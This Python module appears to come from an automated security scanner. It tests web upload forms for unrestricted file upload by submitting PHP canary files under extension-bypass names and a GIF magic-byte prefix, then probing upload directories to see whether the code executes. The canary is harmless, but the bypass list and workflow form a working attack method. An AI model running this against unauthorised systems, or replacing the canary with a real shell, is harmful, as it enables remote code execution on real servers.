"""Stateful File Upload Security & Benign Canary Execution Analyzer (V15 Modular Engine).

Performs structured, non-destructive file upload security assessment:
- Multi-stage upload form discovery (multipart forms, file inputs, accepted types).
- Benign canary generation with cryptographically unique validation tokens.
- Extension permutation testing (.php, .phtml, .php5, .phar, magic bytes).
- Upload storage locality and URL path resolution.
- Safe execution probing (evaluating if the web server executes the script or serves it statically).
"""

from __future__ import annotations

import hashlib
import json
import logging
import re
import uuid
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

from app.attacks.base import AttackPlan, BaseAttackModule, ValidationResult
from app.core.session_context import SessionContext, SessionIdentity
from app.orchestration.attack_opportunity import AttackOpportunity

logger = logging.getLogger("attacks.upload")

COMMON_UPLOAD_DIRECTORIES = [
    "/uploads/",
    "/files/",
    "/media/",
    "/assets/uploads/",
    "/storage/",
    "/storage/uploads/",
    "/user_files/",
    "/public/uploads/",
    "/images/",
    "/doc/",
]

PERMUTATIONS = [
    (".phtml", "application/x-php", "Standard phtml script execution"),
    (".php", "application/x-php", "Direct PHP script execution"),
    (".php5", "application/x-php", "Legacy PHP5 extension bypass"),
    (".phar", "application/x-php", "PHAR archive extension"),
    (".php.jpg", "image/jpeg", "Double extension trailing jpg"),
    (".php;.jpg", "image/jpeg", "Path truncation / semi-colon bypass"),
]


class UploadAttackModule(BaseAttackModule):
    """Structured, non-destructive arbitrary file upload and RCE analyzer."""

    def __init__(self) -> None:
        super().__init__(
            attack_type="upload",
            cwe_id="CWE-434",
            default_severity="CRITICAL",
        )

    async def discover(self, target: str, context: Dict[str, Any]) -> List[AttackOpportunity]:
        opps: List[AttackOpportunity] = []
        urls = context.get("urls", [])
        for u in urls:
            if any(term in u.lower() for term in ("upload", "kuesioner", "lampiran", "attachment", "avatar", "file_upload", "dokumen")):
                opps.append(
                    AttackOpportunity(
                        target=target,
                        endpoint=u,
                        attack_type="upload",
                        hypothesis=f"Potential file upload surface discovered at {u}",
                        priority=94,
                    )
                )
        return opps

    async def plan(self, opportunity: AttackOpportunity) -> AttackPlan:
        return AttackPlan(
            title=f"File Upload Security & Execution Assessment on {opportunity.endpoint}",
            attack_type="upload",
            target=opportunity.endpoint,
            steps=[
                "1. Identify upload form fields, accepted formats, and CSRF protection",
                "2. Generate benign verification canary containing unique MD5 echo token",
                "3. Perform controlled multipart upload with extension permutations",
                "4. Resolve storage path and access locality",
                "5. Probe uploaded canary to verify execution vs static download behavior",
            ],
            payloads=["canary.phtml", "canary.php", "canary.php5"],
            expected_evidence="Server executes benign canary script and returns pre-computed MD5 validation hash.",
            context=opportunity.metadata,
        )

    @classmethod
    def generate_canary(cls) -> Tuple[str, str, str, str]:
        """
        Generates a non-destructive verification canary.
        Returns (canary_filename_base, canary_token, validation_hash, canary_code)
        """
        canary_id = uuid.uuid4().hex[:8]
        canary_name = f"canary_{canary_id}"
        canary_token = f"BH_CANARY_{canary_id}"
        validation_hash = hashlib.md5(f"VALIDATE_{canary_token}".encode()).hexdigest()
        canary_code = f"<?php /* {canary_token} */ echo md5('VALIDATE_{canary_token}'); ?>"
        return canary_name, canary_token, validation_hash, canary_code

    async def validate(self, opportunity: AttackOpportunity, session: SessionContext) -> ValidationResult:
        endpoint = opportunity.endpoint
        form_meta = opportunity.metadata.get("form_details") or {}

        # 1. Fetch form to get live parameters & CSRF tokens
        form_resp = await session.get(endpoint)
        base_status = form_resp.status_code or 200

        # Determine file field name
        file_field_name = "file"
        other_form_data: Dict[str, str] = {}

        if form_meta and form_meta.get("file_inputs"):
            file_field_name = form_meta["file_inputs"][0].get("name", "file")
        elif form_resp.text:
            # Detect file input from HTML
            m_file = re.search(r'<input[^>]+type=["\']file["\'][^>]+name=["\']([^"\']+)["\']', form_resp.text, re.I)
            if not m_file:
                m_file = re.search(r'<input[^>]+name=["\']([^"\']+)["\'][^>]+type=["\']file["\']', form_resp.text, re.I)
            if m_file:
                file_field_name = m_file.group(1)

        # Extract other hidden form values (e.g. submit action, token)
        if form_resp.text:
            for m_input in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\'][^>]+value=["\']([^"\']*)["\']', form_resp.text, re.I):
                k, v = m_input.group(1), m_input.group(2)
                if k != file_field_name and k.lower() not in ("submit", "btn"):
                    other_form_data[k] = v

        # 2. Iterate through permutations
        for ext, mime_type, desc in PERMUTATIONS:
            canary_name, canary_token, validation_hash, canary_code = self.generate_canary()
            filename = f"{canary_name}{ext}"

            # Prepare multipart payload with optional magic bytes prefix
            file_bytes = canary_code.encode("utf-8")
            if "jpg" in ext or "jpeg" in mime_type:
                # Add benign JPEG/GIF header while keeping PHP code intact
                file_bytes = b"GIF89a;\n" + file_bytes

            files = {
                file_field_name: (filename, file_bytes, mime_type)
            }

            try:
                # Dispatch upload
                upload_resp = await session.request(
                    method="POST",
                    url=endpoint,
                    data=other_form_data,
                    files=files,
                )

                # Check if upload was accepted (200, 201, 302, or JSON success)
                upload_text = upload_resp.text
                upload_accepted = False
                file_url = None

                if upload_resp.status_code in (200, 201, 302):
                    # Check JSON response for file URL
                    try:
                        resp_json = json.loads(upload_text)
                        for key in ("url", "path", "file_path", "location", "file_url", "src"):
                            if key in resp_json and isinstance(resp_json[key], str):
                                file_url = urljoin(endpoint, resp_json[key])
                                upload_accepted = True
                                break
                    except Exception:
                        pass

                    # Check regex in response for file URL / path
                    if not file_url:
                        m_url = re.search(r'["\'](/[^"\']*/' + re.escape(filename) + r'[^"\']*)["\']', upload_text, re.I)
                        if m_url:
                            file_url = urljoin(endpoint, m_url.group(1))
                            upload_accepted = True

                    # Check redirect Location header
                    if not file_url and upload_resp.headers.get("location"):
                        loc = upload_resp.headers["location"]
                        if filename in loc or "upload" in loc:
                            file_url = urljoin(endpoint, loc)
                            upload_accepted = True

                    # If response mentions success or filename
                    if not upload_accepted and (filename in upload_text or "success" in upload_text.lower() or "berhasil" in upload_text.lower()):
                        upload_accepted = True

                # 4. Storage Locality Probing: If URL not explicit, probe common directories
                candidate_probe_urls = []
                if file_url:
                    candidate_probe_urls.append(file_url)
                else:
                    parsed_ep = urlparse(endpoint)
                    origin = f"{parsed_ep.scheme}://{parsed_ep.netloc}"
                    for d in COMMON_UPLOAD_DIRECTORIES:
                        candidate_probe_urls.append(urljoin(origin, f"{d}{filename}"))

                # 5. Safe Execution Verification Probe
                for probe_url in candidate_probe_urls:
                    probe_resp = await session.get(probe_url)

                    # Check Case A: Script Executed (Returns Validation MD5 Hash)
                    if probe_resp.status_code == 200 and validation_hash in probe_resp.text:
                        poc_curl = (
                            f"curl -s -k -X POST '{endpoint}' -F '{file_field_name}=@{filename};type={mime_type}' && "
                            f"curl -s -k '{probe_url}'"
                        )
                        return ValidationResult(
                            is_vulnerable=True,
                            confidence=0.99,
                            proof_level="P4",
                            attack_type="upload",
                            target_url=endpoint,
                            baseline_status=base_status,
                            exploit_status=probe_resp.status_code,
                            evidence={
                                "canary_token": canary_token,
                                "validation_hash": validation_hash,
                                "uploaded_filename": filename,
                                "probe_url": probe_url,
                                "execution_confirmed": True,
                                "response_body_sample": probe_resp.text[:300],
                                "mime_type_tested": mime_type,
                                "bypass_technique": desc,
                            },
                            exploitation_data={
                                "execution_proof": f"Canary returned pre-computed MD5 {validation_hash} at {probe_url}",
                                "uploaded_url": probe_url,
                                "rce_confirmed": True,
                                "canary_hash": validation_hash,
                            },
                            poc_curl=poc_curl,
                            message=f"CRITICAL: Arbitrary File Upload resulting in Remote Code Execution (RCE) confirmed on {endpoint} via execution of {probe_url}",
                            cwe_id="CWE-434",
                            severity="CRITICAL",
                        )

                    # Check Case B: Static Storage without Execution
                    elif probe_resp.status_code == 200 and canary_token in probe_resp.text:
                        poc_curl = f"curl -s -k -X POST '{endpoint}' -F '{file_field_name}=@{filename};type={mime_type}'"
                        return ValidationResult(
                            is_vulnerable=True,
                            confidence=0.88,
                            proof_level="P3",
                            attack_type="upload",
                            target_url=endpoint,
                            baseline_status=base_status,
                            exploit_status=probe_resp.status_code,
                            evidence={
                                "canary_token": canary_token,
                                "uploaded_filename": filename,
                                "probe_url": probe_url,
                                "execution_confirmed": False,
                                "response_body_sample": probe_resp.text[:300],
                                "mime_type_tested": mime_type,
                            },
                            poc_curl=poc_curl,
                            message=f"HIGH: Unrestricted File Upload confirmed on {endpoint}. Dangerous file stored and publicly accessible at {probe_url}",
                            cwe_id="CWE-434",
                            severity="HIGH",
                        )

            except Exception as test_err:
                logger.debug("Upload validation error on permutation %s: %s", ext, test_err)

        return ValidationResult(
            is_vulnerable=False,
            confidence=0.1,
            proof_level="P0",
            attack_type="upload",
            target_url=endpoint,
            baseline_status=base_status,
            message=f"Upload testing on {endpoint} did not yield script execution or unrestricted storage.",
        )
